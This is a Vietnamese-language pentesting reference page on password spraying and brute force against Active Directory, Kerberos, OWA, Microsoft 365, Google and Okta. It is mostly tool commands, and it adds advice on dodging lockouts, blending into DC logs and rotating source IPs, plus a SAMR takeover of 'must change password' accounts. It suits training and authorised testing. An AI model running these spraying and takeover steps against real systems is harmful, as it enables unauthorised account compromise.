# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sau khi tìm thấy một số **tên người dùng hợp lệ**, bạn có thể thử các **mật khẩu phổ biến nhất** (hãy lưu ý chính sách mật khẩu của môi trường) với từng người dùng đã phát hiện.\
Theo **mặc định**, **độ dài** **mật khẩu** tối thiểu là **7**.

Danh sách tên người dùng phổ biến cũng có thể hữu ích: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Lưu ý rằng bạn **có thể khóa một số tài khoản nếu thử nhiều mật khẩu sai** (theo mặc định là hơn 10 lần).

### Lấy chính sách mật khẩu

Nếu bạn có thông tin đăng nhập của một người dùng hoặc shell với tư cách là người dùng domain, bạn có thể **lấy chính sách mật khẩu bằng cách**:

```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```

### Khai thác từ Linux (hoặc tất cả)

- Sử dụng **crackmapexec:**

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

- Sử dụng **NetExec (CME successor)** để thực hiện spraying có mục tiêu, ít gây nhiễu trên SMB/WinRM:

```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
  --continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```

- Sử dụng [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)

```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```

- [**spray**](https://github.com/Greenwolf/Spray) _**(bạn có thể chỉ định số lần thử để tránh bị khóa tài khoản):**_<sup>[[3]](#references)</sup>

```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

- Sử dụng [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - KHÔNG KHUYẾN NGHỊ, ĐÔI KHI KHÔNG HOẠT ĐỘNG<sup>[[2]](#references)</sup>

```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```

- Với module `scanner/smb/smb_login` của **Metasploit**:

![Password Spraying - Brute-Force: Với module scanner/smb/smb login của Metasploit](<../../images/image (745).png>)

- Sử dụng **rpcclient**:<sup>[[6]](#references)</sup>

```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```

#### Trên Windows

- Với phiên bản [Rubeus](https://github.com/Zer1t0/Rubeus) có module brute:

```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

- Với [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Theo mặc định, công cụ có thể tạo danh sách người dùng từ domain, lấy chính sách mật khẩu của domain và giới hạn số lần thử theo chính sách đó):<sup>[[4]](#references)</sup>

```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

- Với [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)

```
Invoke-SprayEmptyPassword
```

### Xác định và chiếm quyền các tài khoản "Password must change at next logon" (SAMR)

Một kỹ thuật ít gây chú ý là thử hàng loạt mật khẩu trống/không gây hại và phát hiện các tài khoản trả về STATUS_PASSWORD_MUST_CHANGE, cho biết mật khẩu đã bị buộc hết hạn và có thể được đổi mà không cần biết mật khẩu cũ.<sup>[[9]](#references)[[10]](#references)</sup>

Quy trình:
- Liệt kê người dùng (brute-force RID qua SAMR) để lập danh sách mục tiêu:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}

```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```

- Thực hiện password spraying với mật khẩu trống và tiếp tục với các hit để thu thập những tài khoản bắt buộc phải đổi mật khẩu ở lần đăng nhập tiếp theo:

```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```

- Với mỗi kết quả khớp, đổi mật khẩu qua SAMR bằng module của NetExec (không cần mật khẩu cũ khi đã đặt tùy chọn "must change"):

```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```

Ghi chú vận hành:
- Đảm bảo đồng hồ trên máy của bạn đồng bộ với DC trước khi thực hiện các thao tác dựa trên Kerberos: `sudo ntpdate <dc_fqdn>`.
- Dấu [+] không kèm (Pwn3d!) trong một số module (ví dụ: RDP/WinRM) nghĩa là thông tin xác thực hợp lệ nhưng tài khoản không có quyền đăng nhập tương tác.

## Brute Force

```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```

### Password spraying dựa trên Kerberos pre-auth với nhắm mục tiêu qua LDAP và điều tiết có xét PSO (SpearSpray)

Password spraying dựa trên Kerberos pre-auth giảm nhiễu so với các lần thử SMB/NTLM/LDAP bind và phù hợp hơn với các chính sách khóa tài khoản AD. SpearSpray kết hợp nhắm mục tiêu qua LDAP, pattern engine và khả năng nhận biết chính sách (chính sách domain + PSO + ngưỡng đệm badPwdCount) để thực hiện spraying chính xác và an toàn. Công cụ cũng có thể đánh dấu các principal đã bị xâm nhập trong Neo4j để hỗ trợ tìm đường đi trong BloodHound.<sup>[[1]](#references)</sup>

Ý tưởng chính:
- Khám phá người dùng qua LDAP với phân trang và hỗ trợ LDAPS, tùy chọn sử dụng bộ lọc LDAP tùy chỉnh.
- Lọc dựa trên chính sách khóa tài khoản của domain và PSO để chừa một ngưỡng đệm số lần thử có thể cấu hình, tránh khóa tài khoản người dùng.
- Xác thực Kerberos pre-auth bằng các binding gssapi nhanh (tạo sự kiện 4768/4771 trên DC thay vì 4625).
- Tạo mật khẩu theo pattern cho từng người dùng, sử dụng các biến như tên và giá trị thời gian suy ra từ pwdLastSet của từng người dùng.
- Kiểm soát thông lượng bằng threads, jitter và số yêu cầu tối đa mỗi giây.
- Tích hợp Neo4j tùy chọn để đánh dấu người dùng đã sở hữu cho BloodHound.

Cách sử dụng cơ bản và khám phá:

```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```

Nhắm mục tiêu và kiểm soát mẫu:

```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
  -q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```

Các biện pháp kiểm soát stealth và an toàn:

```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```

Neo4j/BloodHound enrichment (bổ sung dữ liệu):

```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```

Tổng quan về hệ thống pattern (patterns.txt):

```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```

Các biến hiện có:
- {name}, {samaccountname}
- Thời gian lấy từ pwdLastSet (hoặc whenCreated) của từng người dùng: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Các thành phần hỗ trợ tạo mật khẩu và token của tổ chức: {separator}, {suffix}, {extra}

Lưu ý vận hành:
- Ưu tiên truy vấn PDC-emulator bằng -dc để đọc badPwdCount và thông tin liên quan đến policy một cách chính xác nhất.
- badPwdCount được reset khi có lần thử tiếp theo sau khoảng thời gian quan sát; hãy sử dụng ngưỡng và thời điểm phù hợp để đảm bảo an toàn.
- Các lần thử Kerberos pre-auth xuất hiện trong telemetry của DC dưới dạng 4768/4771; hãy sử dụng jitter và rate-limiting để hòa lẫn vào lưu lượng bình thường.

> Mẹo: Kích thước trang LDAP mặc định của SpearSpray là 200; điều chỉnh bằng -lps khi cần.

## Outlook Web Access

Có nhiều công cụ để **password spraying outlook**.

- Với [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Với [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Với [Ruler](https://github.com/sensepost/ruler) (đáng tin cậy!)<sup>[[5]](#references)</sup>
- Với [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Với [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Để sử dụng bất kỳ công cụ nào trong số này, bạn cần danh sách người dùng và một mật khẩu / một danh sách nhỏ các mật khẩu để spray.

```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
    [x] Failed: larsson:Summer2020
    [x] Failed: cube0x0:Summer2020
    [x] Failed: a.admin:Summer2020
    [x] Failed: c.cube:Summer2020
    [+] Success: s.svensson:Summer2020
```

## Microsoft 365 / Entra ID

Đối với cloud spraying, trước tiên hãy xác định tenant thuộc loại **managed**, **federated** hay **hybrid**, vì endpoint và cách hoạt động của cơ chế khóa tài khoản có thể khác với AD on-prem. Trong Microsoft Entra, **Smart Lockout** thay đổi cách các lần đoán lặp lại làm tiêu hao hạn mức khóa tài khoản:<sup>[[7]](#references)</sup>

- Lặp lại **cùng một mật khẩu sai** sẽ không tiếp tục tăng bộ đếm khóa tài khoản, nhưng thử **các mật khẩu khác** thì có.
- Các vị trí **quen thuộc** và **không quen thuộc** có bộ đếm **riêng biệt**.
- Tenant sử dụng **pass-through authentication (PTA)** không được hưởng lợi từ cơ chế theo dõi hash mật khẩu sai, vì vậy hãy xem chúng như các mục tiêu nhạy cảm với cơ chế khóa tài khoản kiểu cổ điển.

Trên thực tế, hãy spray **một mật khẩu mỗi lượt**, giãn cách đủ lâu giữa các lượt và ưu tiên công cụ có thể phát hiện luồng xác thực thực tế của tenant trước khi gửi các lần đoán.

- Với [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), bạn có thể recon tenant, phát hiện `token_endpoint`, spray `msol`/`adfs`/`owa`/`okta` và luân phiên lưu lượng qua nhiều IP egress:

```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
  --url https://login.windows.net/<tenant-id>/oauth2/token \
  --delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
  --url https://login.windows.net/<tenant-id>/oauth2/token \
  --ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```

- Với [**Spray365**](https://github.com/MarkoH17/Spray365), bạn có thể tạo trước một **execution plan** có thể tiếp tục sau khi tạm dừng, xáo trộn thứ tự xác thực và áp dụng **khoảng trễ tối thiểu cho mỗi người dùng** để tránh khoảng thời gian bị khóa tài khoản:

```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
  -u users.txt -pf passwords.txt --delay 30 -mD 1800 \
  -S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```

- Với [**o365spray**](https://github.com/0xZDH/o365spray), bạn có thể xác thực tenant, liệt kê users bằng các module như `onedrive`, và spray qua `oauth2` hoặc `adfs`, đồng thời giữ **mỗi user chỉ một lần thử** trong mỗi khoảng thời gian khóa tài khoản. Nếu đã có FireProx API, hãy truyền API đó bằng `--proxy-url` để phân tán các địa chỉ IP nguồn:

```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```

Kỹ thuật tác chiến gần đây cũng chuyển sang **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) hỗ trợ các khung thời gian, xáo trộn mật khẩu, password spraying ADFS/M365 và tự động exfiltration sau xác thực. Các vụ lạm dụng thực tế gần đây cũng sử dụng **Microsoft Teams API** để liệt kê tài khoản và **xoay vòng khu vực AWS** nhằm phân tán các đợt spraying qua nhiều khu vực địa lý nguồn.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [1] [SpearSpray – Nâng cao Password Spraying Active Directory bằng thông tin tình báo về người dùng](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Brute-force Kerberos bằng Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – Công cụ Password Spraying cho thông tin xác thực Active Directory](https://github.com/Greenwolf/Spray)
- [4] [Password Spraying Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying và các thủ thuật thú vị khác với RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Khóa thông minh của Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Kẻ tấn công tung ra TeamFiltration: Chiến dịch chiếm quyền tài khoản](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: từ spray đến gMSA rồi DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — LDAP ẩn danh → Password Spray → SeBackupPrivilege → Quản trị viên miền](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
{{#include ../../banners/hacktricks-training.md}}
